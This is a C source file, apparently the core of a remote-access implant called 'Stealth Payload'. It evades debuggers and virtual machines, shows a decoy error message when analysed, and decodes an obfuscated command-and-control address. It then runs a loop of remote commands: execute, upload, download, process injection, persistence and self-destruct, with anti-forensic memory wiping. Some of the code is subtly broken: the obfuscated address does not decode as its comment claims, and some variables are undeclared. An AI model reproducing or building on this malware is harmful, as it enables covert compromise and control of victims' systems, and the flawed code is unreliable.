/*
 * Stealth Payload - Main Entry Point
 * Advanced minimal C implementation with anti-analysis
 */

#include <stdint.h>
#include <stddef.h>
#include "config.h"
#include "utils.h"
#include "commands.h"
#include "../crypto/aes.h"
#include "../network/protocol.h"

// Anti-debugging macro
#define ANTI_DEBUG() __asm__ volatile("int3; .byte 0x64, 0x67, 0x90")

// Obfuscated strings (XOR encrypted at compile time)
static const uint8_t srv_addr[] = {0x4c, 0x50, 0x44, 0x56, 0x4c, 0x49, 0x4f, 0x45, 0x00}; // "localhost" XOR 0x3C

// Global context (minimal footprint)
typedef struct {
    void* sock;
    uint8_t aes_key[32];
    uint8_t session_id[16];
    uint32_t flags;
    void* heap;
} context_t;

// Custom entry point to avoid CRT
#ifdef _WIN32
    #include <windows.h>
    
    // Direct syscall definitions
    typedef NTSTATUS (WINAPI *NtAllocateVirtualMemory_t)(
        HANDLE ProcessHandle,
        PVOID *BaseAddress,
        ULONG_PTR ZeroBits,
        PSIZE_T RegionSize,
        ULONG AllocationType,
        ULONG Protect
    );
    
    // Minimal PE entry without CRT
    void __stdcall WinMainCRTStartup() {
        ExitProcess(payload_main());
    }
#else
    // Linux/macOS entry without libc
    void _start() {
        int ret = payload_main();
        // Direct syscall exit
        #ifdef _LINUX
            __asm__ volatile(
                "movl %0, %%ebx\n"
                "movl $1, %%eax\n"
                "int $0x80\n"
                : : "r"(ret) : "ebx", "eax"
            );
        #else
            __asm__ volatile(
                "movl %0, %%edi\n"
                "movl $0x2000001, %%eax\n"
                "syscall\n"
                : : "r"(ret) : "edi", "eax"
            );
        #endif
    }
#endif

// Anti-VM detection
static int detect_vm() {
    #ifdef _WIN32
        // CPUID-based VM detection
        int cpuinfo[4] = {0};
        __asm__ volatile(
            "cpuid"
            : "=a"(cpuinfo[0]), "=b"(cpuinfo[1]), 
              "=c"(cpuinfo[2]), "=d"(cpuinfo[3])
            : "a"(0x40000000)
        );
        
        // Check for hypervisor signatures
        if (cpuinfo[1] == 0x61774d56 || // "VMwa"
            cpuinfo[1] == 0x4b4d564b || // "KVMK"
            cpuinfo[1] == 0x6f727458)   // "Xeno"
            return 1;
    #endif
    
    // Timing-based detection
    uint64_t t1 = get_timestamp();
    sleep_ms(10);
    uint64_t t2 = get_timestamp();
    
    // VMs often have inconsistent timing
    if ((t2 - t1) < 9 || (t2 - t1) > 15)
        return 1;
        
    return 0;
}

// Anti-debugging checks
static int detect_debugger() {
    #ifdef _WIN32
        // Multiple detection methods
        
        // 1. IsDebuggerPresent (obfuscated)
        BOOL (*IDP)(void) = (BOOL(*)(void))GetProcAddress(
            GetModuleHandleA("kernel32.dll"), 
            decrypt_string("IsDebuggerPresent")
        );
        if (IDP && IDP()) return 1;
        
        // 2. PEB BeingDebugged flag
        __asm__ volatile(
            "movl %%fs:0x30, %%eax\n"
            "movzbl 0x02(%%eax), %%eax\n"
            : "=a"(result)
        );
        if (result) return 1;
        
        // 3. Hardware breakpoint detection
        CONTEXT ctx = {0};
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        if (GetThreadContext(GetCurrentThread(), &ctx)) {
            if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3)
                return 1;
        }
        
        // 4. Timing check
        uint64_t start = __rdtsc();
        __asm__ volatile("nop");
        uint64_t end = __rdtsc();
        if ((end - start) > 1000) return 1;
        
    #elif defined(_LINUX)
        // Linux anti-debug
        
        // 1. Check /proc/self/status for TracerPid
        int fd = open("/proc/self/status", 0);
        if (fd >= 0) {
            char buf[4096];
            read(fd, buf, sizeof(buf));
            close(fd);
            if (strstr(buf, "TracerPid:\t0") == NULL)
                return 1;
        }
        
        // 2. ptrace self-attach
        if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1)
            return 1;
    #endif
    
    return 0;
}

// Custom heap allocator (avoid malloc for stealth)
static void* stealth_alloc(size_t size) {
    static uint8_t heap[65536];
    static size_t heap_ptr = 0;
    
    if (heap_ptr + size > sizeof(heap))
        return NULL;
        
    void* ptr = &heap[heap_ptr];
    heap_ptr += (size + 7) & ~7; // 8-byte alignment
    
    // Zero memory
    for (size_t i = 0; i < size; i++)
        ((uint8_t*)ptr)[i] = 0;
        
    return ptr;
}

// String deobfuscation
static void decrypt_string(uint8_t* str) {
    while (*str) {
        *str ^= 0x3C;
        str++;
    }
}

// Initialize crypto
static int init_crypto(context_t* ctx) {
    // Generate session key using hardware RNG if available
    #ifdef _WIN32
        // Use Windows CNG
        BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RNG_ALGORITHM, NULL, 0);
        BCryptGenRandom(hAlg, ctx->aes_key, 32, 0);
        BCryptCloseAlgorithmProvider(hAlg, 0);
    #else
        // Use /dev/urandom
        int fd = open("/dev/urandom", 0);
        if (fd >= 0) {
            read(fd, ctx->aes_key, 32);
            close(fd);
        } else {
            // Fallback to PRNG
            srand(get_timestamp());
            for (int i = 0; i < 32; i++)
                ctx->aes_key[i] = rand() & 0xFF;
        }
    #endif
    
    return 0;
}

// Main connection loop
static int connection_loop(context_t* ctx) {
    packet_t pkt;
    uint8_t buffer[4096];
    
    while (1) {
        // Receive command
        if (protocol_recv(ctx->sock, &pkt, ctx->aes_key) < 0) {
            // Connection lost, attempt reconnect
            sleep_ms(2000);
            if (network_connect(ctx) < 0)
                continue;
        }
        
        // Process command
        int result = 0;
        switch (pkt.cmd_id) {
            case CMD_PING:
                protocol_send_status(ctx->sock, STATUS_OK, ctx->aes_key);
                break;
                
            case CMD_EXEC:
                result = cmd_execute(pkt.data, pkt.data_len, buffer, sizeof(buffer));
                protocol_send_data(ctx->sock, buffer, result, ctx->aes_key);
                break;
                
            case CMD_DOWNLOAD:
                result = cmd_download(pkt.data, ctx->sock, ctx->aes_key);
                break;
                
            case CMD_UPLOAD:
                result = cmd_upload(pkt.data, pkt.data_len, ctx->sock, ctx->aes_key);
                break;
                
            case CMD_INJECT:
                result = cmd_inject_process(pkt.data, pkt.data_len);
                protocol_send_status(ctx->sock, result ? STATUS_OK : STATUS_ERROR, ctx->aes_key);
                break;
                
            case CMD_PERSIST:
                result = cmd_install_persistence();
                protocol_send_status(ctx->sock, result ? STATUS_OK : STATUS_ERROR, ctx->aes_key);
                break;
                
            case CMD_KILLSWITCH:
                cmd_self_destruct(ctx);
                return 0;
                
            default:
                protocol_send_status(ctx->sock, STATUS_UNKNOWN_CMD, ctx->aes_key);
                break;
        }
        
        // Anti-forensics: Clear sensitive data from stack
        secure_zero(&pkt, sizeof(pkt));
        secure_zero(buffer, sizeof(buffer));
    }
    
    return 0;
}

// Entry point
int payload_main() {
    context_t ctx = {0};
    
    // Anti-analysis checks
    if (detect_vm() || detect_debugger()) {
        // Decoy behavior - act like legitimate program
        #ifdef _WIN32
            MessageBoxA(NULL, "This application requires Windows 10 or later.", "Error", MB_OK);
        #endif
        return 1;
    }
    
    // Initialize subsystems
    ctx.heap = stealth_alloc(32768);
    init_crypto(&ctx);
    
    // Decode C2 address
    uint8_t server[64];
    memcpy(server, srv_addr, sizeof(srv_addr));
    decrypt_string(server);
    
    // Main loop with reconnection
    while (1) {
        if (network_connect(&ctx, server, 4433) == 0) {
            connection_loop(&ctx);
        }
        
        // Exponential backoff for reconnection
        static int delay = 1000;
        sleep_ms(delay);
        delay = (delay * 2) < 60000 ? (delay * 2) : 60000;
    }
    
    return 0;
}

// Secure memory wipe
void secure_zero(void* ptr, size_t size) {
    volatile uint8_t* p = (volatile uint8_t*)ptr;
    while (size--) *p++ = 0;
    
    // Memory barrier to prevent optimization
    __asm__ volatile("" ::: "memory");
}